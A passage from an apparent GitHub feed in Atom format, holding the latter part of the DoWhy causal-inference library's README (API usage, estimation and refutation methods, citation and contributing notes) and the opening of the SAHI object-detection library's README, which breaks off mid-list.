the target estimand using a statistical method.&#xA;estimate = model.estimate_effect(identified_estimand,&#xA;                                 method_name=&#34;backdoor.propensity_score_matching&#34;)&#xA;&#xA;# IV. Refute the obtained estimate using multiple robustness checks.&#xA;refute_results = model.refute_estimate(identified_estimand, estimate,&#xA;                                       method_name=&#34;random_common_cause&#34;)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;DoWhy stresses on the interpretability of its output. At any point in the analysis, you can inspect the untested assumptions, identified estimands (if any) and the estimate (if any). Here&#39;s a sample output of the linear regression estimator.&lt;/p&gt; &#xA;&lt;p&gt;.. image:: &lt;a href=&#34;https://raw.githubusercontent.com/microsoft/dowhy/master/docs/images/regression_output.png&#34;&gt;https://raw.githubusercontent.com/microsoft/dowhy/master/docs/images/regression_output.png&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;For a full code example, check out the &lt;code&gt;Getting Started with DoWhy &amp;lt;https://github.com/microsoft/dowhy/blob/master/docs/source/example_notebooks/dowhy_simple_example.ipynb&amp;gt;&lt;/code&gt;_ notebook. You can also use Conditional Average Treatment Effect (CATE) estimation methods from other libraries such as EconML and CausalML, as shown in the &lt;code&gt;Conditional Treatment Effects &amp;lt;https://github.com/microsoft/dowhy/blob/master/docs/source/example_notebooks/dowhy-conditional-treatment-effects.ipynb&amp;gt;&lt;/code&gt;_ notebook. For more examples of using DoWhy, check out the Jupyter notebooks in &lt;code&gt;docs/source/example_notebooks &amp;lt;https://github.com/microsoft/dowhy/tree/master/docs/source/example_notebooks/&amp;gt;&lt;/code&gt;_ or try them online at &lt;code&gt;Binder &amp;lt;https://mybinder.org/v2/gh/microsoft/dowhy/master?filepath=docs%2Fsource%2F&amp;gt;&lt;/code&gt;_.&lt;/p&gt; &#xA;&lt;h2&gt;A high-level Pandas API&lt;/h2&gt; &#xA;&lt;p&gt;We&#39;ve made an even simpler API for dowhy which is a light layer on top of the standard one. The goal is to make causal analysis much more like regular exploratory analysis. To use this API, simply import :code:&lt;code&gt;dowhy.api&lt;/code&gt;. This will magically add the :code:&lt;code&gt;causal&lt;/code&gt; namespace to your :code:&lt;code&gt;pandas.DataFrame&lt;/code&gt; s. Then, you can use the namespace as follows.&lt;/p&gt; &#xA;&lt;p&gt;.. code:: python&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;import dowhy.api&#xA;import dowhy.datasets&#xA;&#xA;data = dowhy.datasets.linear_dataset(beta=5,&#xA;    num_common_causes=1,&#xA;    num_instruments = 0,&#xA;    num_samples=1000,&#xA;    treatment_is_binary=True)&#xA;&#xA;# data[&#39;df&#39;] is just a regular pandas.DataFrame&#xA;data[&#39;df&#39;].causal.do(x=&#39;v0&#39;, # name of treatment variable&#xA;                     variable_types={&#39;v0&#39;: &#39;b&#39;, &#39;y&#39;: &#39;c&#39;, &#39;W0&#39;: &#39;c&#39;},&#xA;                     outcome=&#39;y&#39;,&#xA;                     common_causes=[&#39;W0&#39;]).groupby(&#39;v0&#39;).mean().plot(y=&#39;y&#39;, kind=&#39;bar&#39;)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;.. image:: &lt;a href=&#34;https://raw.githubusercontent.com/microsoft/dowhy/master/docs/images/do_barplot.png&#34;&gt;https://raw.githubusercontent.com/microsoft/dowhy/master/docs/images/do_barplot.png&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;For some methods, the :code:&lt;code&gt;variable_types&lt;/code&gt; field must be specified. It should be a :code:&lt;code&gt;dict&lt;/code&gt;, where the keys are variable names, and values are &#39;o&#39; for ordered discrete, &#39;u&#39; for un-ordered discrete, &#39;d&#39; for discrete, or &#39;c&#39; for continuous.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Note:If the&lt;/strong&gt; :code:&lt;code&gt;variable_types&lt;/code&gt; &lt;strong&gt;is not specified we make use of the following implicit conversions:&lt;/strong&gt; ::&lt;/p&gt; &#xA;&lt;p&gt;int -&amp;gt; &#39;c&#39; float -&amp;gt; &#39;c&#39; binary -&amp;gt; &#39;b&#39; category -&amp;gt; &#39;d&#39;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Currently we have not added support for timestamps.&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;The :code:&lt;code&gt;do&lt;/code&gt; method in the causal namespace generates a random sample from $P(outcome|do(X=x))$ of the same length as your data set, and returns this outcome as a new :code:&lt;code&gt;DataFrame&lt;/code&gt;. You can continue to perform the usual :code:&lt;code&gt;DataFrame&lt;/code&gt; operations with this sample, and so you can compute statistics and create plots for causal outcomes!&lt;/p&gt; &#xA;&lt;p&gt;The :code:&lt;code&gt;do&lt;/code&gt; method is built on top of the lower-level :code:&lt;code&gt;dowhy&lt;/code&gt; objects, so can still take a graph and perform identification automatically when you provide a graph instead of :code:&lt;code&gt;common_causes&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;For more details, check out the &lt;code&gt;Pandas API &amp;lt;https://github.com/microsoft/dowhy/blob/master/docs/source/example_notebooks/dowhy_causal_api.ipynb&amp;gt;&lt;/code&gt;_ notebook or the &lt;code&gt;Do Sampler &amp;lt;https://github.com/microsoft/dowhy/blob/master/docs/source/example_notebooks/do_sampler_demo.ipynb&amp;gt;&lt;/code&gt;_ notebook.&lt;/p&gt; &#xA;&lt;h1&gt;Graphical Models and Potential Outcomes: Best of both worlds&lt;/h1&gt; &#xA;&lt;p&gt;DoWhy builds on two of the most powerful frameworks for causal inference: graphical models and potential outcomes. It uses graph-based criteria and do-calculus for modeling assumptions and identifying a non-parametric causal effect. For estimation, it switches to methods based primarily on potential outcomes.&lt;/p&gt; &#xA;&lt;h2&gt;A unifying language for causal inference&lt;/h2&gt; &#xA;&lt;p&gt;DoWhy is based on a simple unifying language for causal inference. Causal inference may seem tricky, but almost all methods follow four key steps:&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;Model a causal inference problem using assumptions.&lt;/li&gt; &#xA; &lt;li&gt;Identify an expression for the causal effect under these assumptions (&#34;causal estimand&#34;).&lt;/li&gt; &#xA; &lt;li&gt;Estimate the expression using statistical methods such as matching or instrumental variables.&lt;/li&gt; &#xA; &lt;li&gt;Finally, verify the validity of the estimate using a variety of robustness checks.&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;This workflow can be captured by four key verbs in DoWhy:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;model&lt;/li&gt; &#xA; &lt;li&gt;identify&lt;/li&gt; &#xA; &lt;li&gt;estimate&lt;/li&gt; &#xA; &lt;li&gt;refute&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Using these verbs, DoWhy implements a causal inference engine that can support a variety of methods. &lt;em&gt;model&lt;/em&gt; encodes prior knowledge as a formal causal graph, &lt;em&gt;identify&lt;/em&gt; uses graph-based methods to identify the causal effect, &lt;em&gt;estimate&lt;/em&gt; uses&lt;br&gt; statistical methods for estimating the identified estimand, and finally &lt;em&gt;refute&lt;/em&gt; tries to refute the obtained estimate by testing robustness to assumptions.&lt;/p&gt; &#xA;&lt;h2&gt;Key differences compared to available causal inference software&lt;/h2&gt; &#xA;&lt;p&gt;DoWhy brings three key differences compared to available software for causal inference:&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Explicit identifying assumptions&lt;/strong&gt; Assumptions are first-class citizens in DoWhy.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;Each analysis starts with a&#xA;building a causal model. The assumptions can be viewed graphically or in terms&#xA;of conditional independence statements. Wherever possible, DoWhy can also&#xA;automatically test for stated assumptions using observed data.&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Separation between identification and estimation&lt;/strong&gt; Identification is the causal problem. Estimation is simply a statistical problem.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;DoWhy&#xA;respects this boundary and treats them separately. This focuses the causal&#xA;inference effort on identification, and frees up estimation using any&#xA;available statistical estimator for a target estimand. In addition, multiple&#xA;estimation methods can be used for a single identified_estimand and&#xA;vice-versa.&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Automated robustness checks&lt;/strong&gt; What happens when key identifying assumptions may not be satisfied?&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;The most critical, and often skipped, part of causal analysis is checking the&#xA;robustness of an estimate to unverified assumptions. DoWhy makes it easy to&#xA;automatically run sensitivity and robustness checks on the obtained estimate.&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Finally, DoWhy is easily extensible, allowing other implementations of the four verbs to co-exist (e.g., we support implementations of the &lt;em&gt;estimation&lt;/em&gt; verb from EconML and CausalML libraries). The four verbs are mutually independent, so their implementations can be combined in any way.&lt;/p&gt; &#xA;&lt;p&gt;Below are more details about the current implementation of each of these verbs.&lt;/p&gt; &#xA;&lt;h1&gt;Four steps of causal inference&lt;/h1&gt; &#xA;&lt;h2&gt;I. Model a causal problem&lt;/h2&gt; &#xA;&lt;p&gt;DoWhy creates an underlying causal graphical model for each problem. This serves to make each causal assumption explicit. This graph need not be complete---you can provide a partial graph, representing prior knowledge about some of the variables. DoWhy automatically considers the rest of the variables as potential confounders.&lt;/p&gt; &#xA;&lt;p&gt;Currently, DoWhy supports two formats for graph input: &lt;code&gt;gml &amp;lt;https://github.com/GunterMueller/UNI_PASSAU_FMI_Graph_Drawing&amp;gt;&lt;/code&gt;_ (preferred) and &lt;code&gt;dot &amp;lt;http://www.graphviz.org/documentation/&amp;gt;&lt;/code&gt;_. We strongly suggest to use gml as the input format, as it works well with networkx. You can provide the graph either as a .gml file or as a string. If you prefer to use dot format, you will need to install additional packages (pydot or pygraphviz, see the installation section above). Both .dot files and string format are supported.&lt;/p&gt; &#xA;&lt;p&gt;While not recommended, you can also specify common causes and/or instruments directly instead of providing a graph.&lt;/p&gt; &#xA;&lt;p&gt;Supported formats for specifying causal assumptions&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;&#xA;* **Graph**: Provide a causal graph in either gml or dot format. Can be a text file&#xA;  or a string.&#xA;* **Named variable sets**: Instead of the graph, provide variable names that&#xA;  correspond to relevant categories, such as common causes, instrumental variables, effect&#xA;  modifiers, frontdoor variables, etc.&#xA;&#xA;Examples of how to instantiate a causal model are in the `Getting Started&#xA;&amp;lt;https://github.com/microsoft/dowhy/blob/master/docs/source/example_notebooks/dowhy_simple_example.ipynb&amp;gt;`_&#xA;notebook.&#xA;&#xA;.. i comment image:: causal_model.png&#xA;&#xA;II. Identify a target estimand under the model&#xA;----------------------------------------------&#xA;&#xA;Based on the causal graph, DoWhy finds all possible ways of identifying a desired causal effect based on&#xA;the graphical model. It uses graph-based criteria and do-calculus to find&#xA;potential ways find expressions that can identify the causal effect. &#xA;&#xA;Supported identification criteria&#xA;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~&#xA;&#xA;* Back-door criterion&#xA;* Front-door criterion&#xA;* Instrumental Variables&#xA;* Mediation (Direct and indirect effect identification)&#xA;&#xA;Different notebooks illustrate how to use these identification criteria. Check&#xA;out the `Simple Backdoor &amp;lt;https://github.com/microsoft/dowhy/blob/master/docs/source/example_notebooks/dowhy_confounder_example.ipynb&amp;gt;`_ notebook for the back-door criterion, and the `Simple IV &amp;lt;https://github.com/microsoft/dowhy/blob/master/docs/source/example_notebooks/dowhy-simple-iv-example.ipynb&amp;gt;`_ notebook for the instrumental variable criterion.&#xA;&#xA;III. Estimate causal effect based on the identified estimand&#xA;------------------------------------------------------------&#xA;&#xA;DoWhy supports methods based on both back-door criterion and instrumental&#xA;variables. It also provides a non-parametric confidence intervals and a permutation test for testing&#xA;the statistical significance of obtained estimate. &#xA;&#xA;Supported estimation methods &#xA;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~&#xA;&#xA;* Methods based on estimating the treatment assignment&#xA;    * Propensity-based Stratification&#xA;    * Propensity Score Matching&#xA;    * Inverse Propensity Weighting&#xA;&#xA;* Methods based on estimating the outcome model&#xA;    * Linear Regression&#xA;    * Generalized Linear Models&#xA;&#xA;* Methods based on the instrumental variable equation&#xA;    * Binary Instrument/Wald Estimator&#xA;    * Two-stage least squares&#xA;    * Regression discontinuity&#xA;&#xA;* Methods for front-door criterion and general mediation&#xA;    * Two-stage linear regression&#xA;&#xA;Examples of using these methods are in the `Estimation methods&#xA;&amp;lt;https://github.com/microsoft/dowhy/blob/master/docs/source/example_notebooks/dowhy_estimation_methods.ipynb&amp;gt;`_&#xA;notebook. &#xA;&#xA;Using EconML and CausalML estimation methods in DoWhy&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;It is easy to call external estimation methods using DoWhy. Currently we support integrations with the &lt;code&gt;EconML &amp;lt;https://github.com/microsoft/econml&amp;gt;&lt;/code&gt;_ and &lt;code&gt;CausalML &amp;lt;https://github.com/uber/causalml&amp;gt;&lt;/code&gt;_ packages. Here&#39;s an example of estimating conditional treatment effects using EconML&#39;s double machine learning estimator.&lt;/p&gt; &#xA;&lt;p&gt;.. code:: python&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;from sklearn.preprocessing import PolynomialFeatures&#xA;from sklearn.linear_model import LassoCV&#xA;from sklearn.ensemble import GradientBoostingRegressor&#xA;dml_estimate = model.estimate_effect(identified_estimand, method_name=&#34;backdoor.econml.dml.DML&#34;,&#xA;                    control_value = 0,&#xA;                    treatment_value = 1,&#xA;                    target_units = lambda df: df[&#34;X0&#34;]&amp;gt;1,&#xA;                    confidence_intervals=False,&#xA;                    method_params={&#xA;                        &#34;init_params&#34;:{&#39;model_y&#39;:GradientBoostingRegressor(),&#xA;                                       &#39;model_t&#39;: GradientBoostingRegressor(),&#xA;                                       &#39;model_final&#39;:LassoCV(), &#xA;                                       &#39;featurizer&#39;:PolynomialFeatures(degree=1, include_bias=True)},&#xA;                        &#34;fit_params&#34;:{}}&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;More examples are in the &lt;code&gt;Conditional Treatment Effects with DoWhy &amp;lt;https://github.com/microsoft/dowhy/blob/master/docs/source/example_notebooks/dowhy-conditional-treatment-effects.ipynb&amp;gt;&lt;/code&gt;_ notebook.&lt;/p&gt; &#xA;&lt;h2&gt;IV. Refute the obtained estimate&lt;/h2&gt; &#xA;&lt;p&gt;Having access to multiple refutation methods to validate an effect estimate from a causal estimator is a key benefit of using DoWhy.&lt;/p&gt; &#xA;&lt;p&gt;Supported refutation methods&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;&#xA;* **Add Random Common Cause**: Does the estimation method change its estimate after&#xA;  we add an independent random variable as a common cause to the dataset?&#xA;  (*Hint: It should not*)&#xA;* **Placebo Treatment**: What happens to the estimated causal effect when we&#xA;  replace the true treatment variable with an independent random variable?&#xA;  (*Hint: the effect should go to zero*)&#xA;* **Dummy Outcome**: What happens to the estimated causal effect when we replace&#xA;  the true outcome variable with an independent random variable? (*Hint: The&#xA;  effect should go to zero*)&#xA;* **Simulated Outcome**: What happens to the estimated causal effect when we&#xA;  replace the dataset with a simulated dataset based on a known data-generating&#xA;  process closest to the given dataset? (*Hint: It should match the effect parameter&#xA;  from the data-generating process*)&#xA;* **Add Unobserved Common Causes**: How sensitive is the effect estimate when we&#xA;  add an additional common cause (confounder) to the dataset that is correlated&#xA;  with the treatment and the outcome? (*Hint: It should not be too sensitive*)&#xA;* **Data Subsets Validation**: Does the estimated effect change significantly when&#xA;  we replace the given dataset with a randomly selected subset? (*Hint: It&#xA;  should not*)&#xA;* **Bootstrap Validation**: Does the estimated effect change significantly when we &#xA;  replace the given dataset with bootstrapped samples from the same dataset? (*Hint: It should not*)&#xA;&#xA;Examples of using refutation methods are in the `Refutations &amp;lt;https://github.com/microsoft/dowhy/blob/master/docs/source/example_notebooks/dowhy_refuter_notebook.ipynb&amp;gt;`_ notebook. For an advanced refutation that uses a simulated dataset based on user-provided or learnt data-generating processes, check out the `Dummy Outcome Refuter &amp;lt;https://github.com/microsoft/dowhy/blob/master/docs/source/example_notebooks/dowhy_demo_dummy_outcome_refuter.ipynb&amp;gt;`_ notebook. &#xA;As a practical example, `this notebook &amp;lt;https://github.com/microsoft/dowhy/blob/master/docs/source/example_notebooks/dowhy_refutation_testing.ipynb&amp;gt;`_ shows an application of refutation methods on evaluating effect estimators for the Infant Health and Development Program (IHDP) and Lalonde datasets. &#xA;&#xA;Citing this package&#xA;====================&#xA;If you find DoWhy useful for your research work, please cite us as follows:&#xA;&#xA;Amit Sharma, Emre Kiciman, et al. DoWhy: A Python package for causal inference. 2019. https://github.com/microsoft/dowhy&#xA;&#xA;Bibtex::&#xA;&#xA;  @misc{dowhy,&#xA;  author={Sharma, Amit and Kiciman, Emre and others},&#xA;  title={Do{W}hy: {A Python package for causal inference}},&#xA;  howpublished={https://github.com/microsoft/dowhy},&#xA;  year={2019}&#xA;  }&#xA;&#xA;Alternatively, you can cite our Arxiv paper on DoWhy. &#xA;&#xA;Amit Sharma, Emre Kiciman. DoWhy: An End-to-End Library for Causal Inference. 2020. https://arxiv.org/abs/2011.04216&#xA;&#xA;Bibtex::&#xA;&#xA;  @article{dowhypaper,&#xA;  title={DoWhy: An End-to-End Library for Causal Inference},&#xA;  author={Sharma, Amit and Kiciman, Emre},&#xA;  journal={arXiv preprint arXiv:2011.04216},&#xA;  year={2020}&#xA;  }&#xA;&#xA;Roadmap &#xA;=======&#xA;The `projects &amp;lt;https://github.com/microsoft/dowhy/projects&amp;gt;`_ page lists the next steps for DoWhy. If you would like to contribute, have a look at the current projects. If you have a specific request for DoWhy, please `raise an issue &amp;lt;https://github.com/microsoft/dowhy/issues&amp;gt;`_.&#xA;&#xA;Contributing&#xA;============&#xA;&#xA;This project welcomes contributions and suggestions. For a guide to contributing and a list of all contributors, check out `CONTRIBUTING.md &amp;lt;https://github.com/microsoft/dowhy/blob/master/CONTRIBUTING.md&amp;gt;`_. You can also join the DoWhy development channel on Discord: |discord|_&#xA;&#xA;.. |discord| image:: https://img.shields.io/discord/818456847551168542&#xA;.. _discord: https://discord.gg/cSBGb3vsZb&#xA;&#xA;&#xA;Most contributions require you to agree to a&#xA;Contributor License Agreement (CLA) declaring that you have the right to, and actually do, grant us&#xA;the rights to use your contribution. For details, visit https://cla.microsoft.com.&#xA;&#xA;When you submit a pull request, a CLA-bot will automatically determine whether you need to provide&#xA;a CLA and decorate the PR appropriately (e.g., label, comment). Simply follow the instructions&#xA;provided by the bot. You will only need to do this once across all repos using our CLA.&#xA;&#xA;This project has adopted the `Microsoft Open Source Code of Conduct &amp;lt;https://opensource.microsoft.com/codeofconduct/&amp;gt;`_.&#xA;For more information see the `Code of Conduct FAQ &amp;lt;https://opensource.microsoft.com/codeofconduct/faq/&amp;gt;`_ or&#xA;contact `opencode@microsoft.com &amp;lt;mailto:opencode@microsoft.com&amp;gt;`_ with any additional questions or comments.&#xA;&lt;/code&gt;&lt;/pre&gt;</summary>
  </entry>
  <entry>
    <title>obss/sahi</title>
    <updated>2022-05-29T01:33:11Z</updated>
    <id>tag:github.com,2022-05-29:/obss/sahi</id>
    <link href="https://github.com/obss/sahi" rel="alternate"></link>
    <summary type="html">&lt;p&gt;A lightweight vision library for performing large scale object detection/ instance segmentation.&lt;/p&gt;&lt;hr&gt;&lt;div align=&#34;center&#34;&gt; &#xA; &lt;h1&gt; SAHI: Slicing Aided Hyper Inference &lt;/h1&gt; &#xA; &lt;h4&gt; A lightweight vision library for performing large scale object detection &amp;amp; instance segmentation &lt;/h4&gt; &#xA; &lt;h4&gt; &lt;img width=&#34;700&#34; alt=&#34;teaser&#34; src=&#34;https://raw.githubusercontent.com/obss/sahi/main/resources/sliced_inference.gif&#34;&gt; &lt;/h4&gt; &#xA; &lt;div&gt; &#xA;  &lt;a href=&#34;https://pepy.tech/project/sahi&#34;&gt;&lt;img src=&#34;https://pepy.tech/badge/sahi&#34; alt=&#34;downloads&#34;&gt;&lt;/a&gt; &#xA;  &lt;a href=&#34;https://pepy.tech/project/sahi&#34;&gt;&lt;img src=&#34;https://pepy.tech/badge/sahi/month&#34; alt=&#34;downloads&#34;&gt;&lt;/a&gt; &#xA;  &lt;a href=&#34;https://doi.org/10.48550/arXiv.2202.06934&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/arXiv-2202.06934-b31b1b.svg?sanitize=true&#34; alt=&#34;ci&#34;&gt;&lt;/a&gt; &#xA;  &lt;br&gt; &#xA;  &lt;a href=&#34;https://badge.fury.io/py/sahi&#34;&gt;&lt;img src=&#34;https://badge.fury.io/py/sahi.svg?sanitize=true&#34; alt=&#34;pypi version&#34;&gt;&lt;/a&gt; &#xA;  &lt;a href=&#34;https://anaconda.org/conda-forge/sahi&#34;&gt;&lt;img src=&#34;https://anaconda.org/conda-forge/sahi/badges/version.svg?sanitize=true&#34; alt=&#34;conda version&#34;&gt;&lt;/a&gt; &#xA;  &lt;a href=&#34;https://github.com/obss/sahi/actions?query=event%3Apush+branch%3Amain+is%3Acompleted+workflow%3ACI&#34;&gt;&lt;img src=&#34;https://github.com/obss/sahi/workflows/CI/badge.svg?sanitize=true&#34; alt=&#34;ci&#34;&gt;&lt;/a&gt; &#xA;  &lt;br&gt; &#xA;  &lt;a href=&#34;https://colab.research.google.com/github/obss/sahi/blob/main/demo/inference_for_yolov5.ipynb&#34;&gt;&lt;img src=&#34;https://colab.research.google.com/assets/colab-badge.svg?sanitize=true&#34; alt=&#34;Open In Colab&#34;&gt;&lt;/a&gt; &#xA;  &lt;a href=&#34;https://huggingface.co/spaces/fcakyon/sahi-yolox&#34;&gt;&lt;img src=&#34;https://raw.githubusercontent.com/obss/sahi/main/resources/hf_spaces_badge.svg?sanitize=true&#34; alt=&#34;HuggingFace Spaces&#34;&gt;&lt;/a&gt; &#xA;  &lt;br&gt; &#xA; &lt;/div&gt; &#xA;&lt;/div&gt; &#xA;&lt;h2&gt;&#xA; &lt;div align=&#34;center&#34;&gt;&#xA;  Overview&#xA; &lt;/div&gt;&lt;/h2&gt; &#xA;&lt;p&gt;Object detection and instance segmentation are by far the most important fields of applications in Computer Vision. However, detection of small objects and inference on large images are still major issues in practical usage. Here comes the SAHI to help developers overcome these real-world problems with many vision utilities.&lt;/p&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;Command&lt;/th&gt; &#xA;   &lt;th&gt;Description&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/obss/sahi/raw/main/docs/cli.md#predict-command-usage&#34;&gt;predict&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;perform sliced/standard video/image prediction using any &lt;a href=&#34;https://github.com/ultralytics/yolov5&#34;&gt;yolov5&lt;/a&gt;/&lt;a href=&#34;https://github.com/open-mmlab/mmdetection&#34;&gt;mmdet&lt;/a&gt;/&lt;a href=&#34;https://github.com/facebookresearch/detectron2&#34;&gt;detectron2&lt;/a&gt; model&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/obss/sahi/raw/main/docs/cli.md#predict-fiftyone-command-usage&#34;&gt;predict-fiftyone&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;perform sliced/standard prediction using any &lt;a href=&#34;https://github.com/ultralytics/yolov5&#34;&gt;yolov5&lt;/a&gt;/&lt;a href=&#34;https://github.com/open-mmlab/mmdetection&#34;&gt;mmdet&lt;/a&gt;/&lt;a href=&#34;https://github.com/facebookresearch/detectron2&#34;&gt;detectron2&lt;/a&gt; model and explore results in &lt;a href=&#34;https://github.com/voxel51/fiftyone&#34;&gt;fiftyone app&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/obss/sahi/raw/main/docs/cli.md#coco-slice-command-usage&#34;&gt;coco slice&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;automatically slice COCO annotation and image files&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/obss/sahi/raw/main/docs/cli.md#coco-fiftyone-command-usage&#34;&gt;coco fiftyone&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;explore multiple prediction results on your COCO dataset with &lt;a href=&#34;https://github.com/voxel51/fiftyone&#34;&gt;fiftyone ui&lt;/a&gt; ordered by number of misdetections&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/obss/sahi/raw/main/docs/cli.md#coco-evaluate-command-usage&#34;&gt;coco evaluate&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;evaluate classwise COCO AP and AR for given predictions and ground truth&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/obss/sahi/raw/main/docs/cli.md#coco-analyse-command-usage&#34;&gt;coco analyse&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;calcualate and export many error analysis plots&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/obss/sahi/raw/main/docs/cli.md#coco-yolov5-command-usage&#34;&gt;coco yolov5&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;automatically convert any COCO dataset to &lt;a href=&#34;https://github.com/ultralytics/yolov5&#34;&gt;yolov5&lt;/a&gt; format&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;h2&gt;&#xA; &lt;div align=&#34;center&#34;&gt;&#xA;  Quick Start Examples&#xA; &lt;/div&gt;&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/obss/sahi/issues/384&#34;&gt;Check this link for a list of competitions that SAHI made us win 🚀&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h3&gt;Tutorials&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://medium.com/codable/sahi-a-vision-library-for-performing-sliced-inference-on-large-images-small-objects-c8b086af3b80&#34;&gt;Introduction to SAHI&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://arxiv.org/abs/2202.06934&#34;&gt;Official paper&lt;/a&gt; (NEW)&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/obss/sahi/issues/457&#34;&gt;Video inference support is live&lt;/a&gt; (NEW)&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://www.kaggle.com/remekkinas/sahi-slicing-aided-hyper-inference-yv5-and-yx&#34;&gt;Kaggle notebook&lt;/a&gt; (NEW)&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://blog.ml6.eu/how-to-detect-small-objects-in-very-large-images-70234bab0f98&#34;&gt;Satellite object detection&lt;/a&gt; (NEW)&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/obss/sahi/issues/356&#34;&gt;Error analysis plots &amp;amp; evaluation&lt;/a&gt; (NEW)&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/obss/sahi/issues/357&#34;&gt;Interactive result visualization and inspection&lt;/a&gt; (NEW)&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://medium.com/codable/convert-any-dataset-to-coco-object-detection-format-with-sahi-95349e1fe2b7&#34;&gt;COCO dataset conversion&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/obss/sahi/main/demo/slicing.ipynb&#34;&gt;Slicing operation notebook&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;code&gt;YOLOX&lt;/code&gt; + &lt;code&gt;SAHI&lt;/code&gt; demo: &lt;a href=&#34;https://huggingface.co/spaces/fcakyon/sahi-yolox&#34;&gt;&lt;img src=&#34;https://raw.githubusercontent.com/obss/sahi/main/resources/hf_spaces_badge.svg?sanitize=true&#34; alt=&#34;sahi-yolox&#34;&gt;&lt;/a&gt; (RECOMMENDED)&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;code&gt;YOLOv5&lt;/code&gt; + &lt;code&gt;SAHI&lt;/code&gt; walkthrough: &lt;a href=&#34;https://colab.research.google.com/github/obss/sahi/blob/main/demo/inference_for_yolov5.ipynb&#34;&gt;&lt;img src=&#34;https://colab.research.google.com/assets/colab-badge.svg?sanitize=true&#34; alt=&#34;sahi-yolov5&#34;&gt;&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;code&gt;MMDetection&lt;/code&gt; + &lt;code&gt;SAHI&lt;/code&gt; walkthrough: &lt;a 